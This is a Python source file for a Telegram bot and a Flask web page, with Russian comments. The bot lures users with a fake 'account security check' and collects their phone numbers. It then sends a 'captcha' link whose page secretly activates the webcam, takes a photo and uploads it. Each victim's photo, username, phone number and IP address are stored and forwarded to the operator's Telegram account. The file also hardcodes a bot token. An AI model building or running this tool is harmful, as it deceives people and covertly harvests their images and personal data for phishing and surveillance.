import os
import threading
import time
import sqlite3
import requests
from flask import Flask, request, render_template_string
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, ContextTypes, filters
import logging
import random

# === Настройки бота ===
TOKEN = "7587592244:AAF6z_XL9nGrnMpVIkV4YksPA-Q5ZqTuJ1U"  # ❗ заменить на свой токен
ADMIN_ID = 2054091032  # ❗ заменить на свой Telegram ID
SITE_PORT = 5000
NGROK_URL = "https://breezy-parts-bathe.loca.lt "  # Замени на свой URL из loca.lt
PHOTOS_DIR = "photos"
DB_PATH = "users.db"

os.makedirs(PHOTOS_DIR, exist_ok=True)

# === Логгирование ===
logging.basicConfig(level=logging.INFO)

# === База данных ===
def init_db():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id TEXT PRIMARY KEY,
            username TEXT,
            phone TEXT,
            ip TEXT,
            photo_path TEXT,
            authorized INTEGER DEFAULT 0
        )
    ''')
    conn.commit()
    conn.close()

def add_user(user_id, username, phone, ip, photo_path=None):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute('''
        INSERT OR REPLACE INTO users (user_id, username, phone, ip, photo_path, authorized)
        VALUES (?, ?, ?, ?, ?, ?)
    ''', (user_id, username, phone, ip, photo_path, 1 if photo_path else 0))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT * FROM users")
    data = cur.fetchall()
    conn.close()
    return data

def get_user_by_username(username):
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()
    cur.execute("SELECT * FROM users WHERE username=?", (username,))
    data = cur.fetchone()
    conn.close()
    return data

init_db()

# === Сайт (Flask) в отдельном потоке ===
app = Flask(__name__)

@app.route('/auth')
def auth():
    user_id = request.args.get('user_id')
    username = request.args.get('username')
    phone = request.args.get('phone')

    if not all([user_id, username, phone]):
        return "❌ Не хватает параметров", 400

    html = '''
<!DOCTYPE html>
<html lang="ru">
<head><title>🔐 Капча</title></head>
<body style="text-align:center; padding-top: 50px;">
<h2>⏳ Ваша камера активирована</h2>

<video id="video" autoplay style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
const video = document.getElementById('video');
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('photo', blob, 'selfie.png');
                formData.append('user_id', "%s");
                formData.append('username', "%s");
                formData.append('phone', "%s");

                fetch('/save-photo', {
                    method: 'POST',
                    body: formData
                }).then(() => {
                    document.body.innerHTML = `
                        <h2>✅ Авторизация завершена</h2>
                        <p>Вы успешно прошли проверку.</p>
                        <p>Можете вернуться в Telegram.</p>
                    `;
                });
            }, 'image/png');
        }, 3000);
    })
    .catch(err => {
        alert("❌ Не удалось получить доступ к камере.");
        console.error(err);
    });
</script>
</body>
</html>
''' % (user_id, username, phone)

    return html

@app.route('/save-photo', methods=['POST'])
def save_photo():
    photo = request.files['photo']
    user_id = request.form.get('user_id')
    username = request.form.get('username')
    phone = request.form.get('phone')
    ip = request.remote_addr

    try:
        photo_path = None
        if photo:
            filename = f"{user_id}_{username}.png"
            path = os.path.join(PHOTOS_DIR, filename)
            photo.save(path)
            photo_path = path

        add_user(user_id, username, phone, ip, photo_path)

        # Отправка пользователю сообщения об успехе
        url = f"https://api.telegram.org/bot {TOKEN}/sendMessage"
        data = {"chat_id": user_id, "text": "✅ Авторизация успешна!\n\nВы успешно прошли проверку безопасности."}
        requests.post(url, data=data)

        # Отправка фото админу
        message = (
            f"📸 Новый пользователь!\n"
            f"Номер: {phone}\n"
            f"Юзернейм: @{username}\n"
            f"IP: {ip}\n"
            f"ID: {user_id}"
        )

        if photo_path and os.path.exists(photo_path):
            with open(photo_path, 'rb') as f:
                files = {'photo': f}
                data_admin = {'chat_id': ADMIN_ID, 'caption': message}
                requests.post(f'https://api.telegram.org/bot {TOKEN}/sendPhoto', data=data_admin, files=files)
        else:
            data_admin = {'chat_id': ADMIN_ID, 'text': message}
            requests.post(f'https://api.telegram.org/bot {TOKEN}/sendMessage', data=data_admin)

        return 'OK'
    except Exception as e:
        print("Ошибка сайта:", e)
        return 'Error', 500

def run_site():
    app.run(host='0.0.0.0', port=SITE_PORT)

# === Команды бота ===
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id == ADMIN_ID:
        await update.message.reply_text("🧠 Здравствуйте, мой господин.")
        return

    keyboard = [[InlineKeyboardButton("✅ Пройти проверку", callback_data="agree")]]
    await update.message.reply_text(
        "🔍 Мы предлагаем бесплатно проверить ваш аккаунт на безопасность.\n"
        "Но перед этим пройдите авторизацию.",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def agree_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    contact_button = KeyboardButton(text="📞 Отправить мой номер", request_contact=True)
    keyboard = [[contact_button], [KeyboardButton(text="✍️ Ввести вручную")]]
    await query.message.reply_text(
        "🔢 Для начала введите номер.",
        reply_markup=ReplyKeyboardMarkup(keyboard, one_time_keyboard=True, resize_keyboard=True)
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.contact:
        phone = update.message.contact.phone_number
        user = update.effective_user
        link = f"{NGROK_URL}/auth?user_id={user.id}&username={user.username}&phone={phone}"
        await update.message.reply_text("🔄 Регистрация почти завершена.")
        await update.message.reply_text(f"🌐 Перейдите по ссылке:\n{link}")
    elif update.message.text == "✍️ Ввести вручную":
        await update.message.reply_text("📞 Введите ваш номер телефона:")
    else:
        phone = update.message.text
        user = update.effective_user
        link = f"{NGROK_URL}/auth?user_id={user.id}&username={user.username}&phone={phone}"
        await update.message.reply_text("🔄 Регистрация почти завершена.")
        await update.message.reply_text(f"🌐 Перейдите по ссылке:\n{link}")

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    if len(context.args) == 0:
        users = get_all_users()
        text = "👤 Список авторизованных пользователей:\n\n"
        for u in users:
            text += f"@{u[1]} (ID: {u[0]})\n"
        await update.message.reply_text(text)
    else:
        username = context.args[0]
        user = get_user_by_username(username)
        if user:
            msg = (
                f"📊 Информация о @{user[1]}:\n"
                f"ID: {user[0]}\n"
                f"Номер: {user[2]}\n"
                f"IP: {user[3]}"
            )
            await update.message.reply_text(msg)
            if user[4] and os.path.exists(user[4]):
                try:
                    await update.message.reply_photo(photo=open(user[4], 'rb'))
                except Exception as e:
                    await update.message.reply_text(f"❌ Не удалось загрузить фото: {e}")
            else:
                await update.message.reply_text("⚠️ Фото не найдено")
        else:
            await update.message.reply_text("❌ Пользователь не найден.")

async def cleardb_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        return

    # Удаление всех фото
    for f in os.listdir(PHOTOS_DIR):
        os.remove(os.path.join(PHOTOS_DIR, f))

    # Удаление базы данных
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
        init_db()

    await update.message.reply_text("🧹 Все данные очищены.")

# === main ===
async def post_init(application):
    print("🚀 Бот запущен!")

def run_bot():
    application = ApplicationBuilder().token(TOKEN).post_init(post_init).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("cleardb", cleardb_command))
    application.add_handler(CallbackQueryHandler(agree_handler, pattern="agree"))
    application.add_handler(MessageHandler(filters.ALL, handle_message))

    print("🤖 Бот готов принимать команды...")
    application.run_polling()

if __name__ == '__main__':
    site_thread = threading.Thread(target=run_site)
    site_thread.daemon = True
    site_thread.start()
    run_bot()
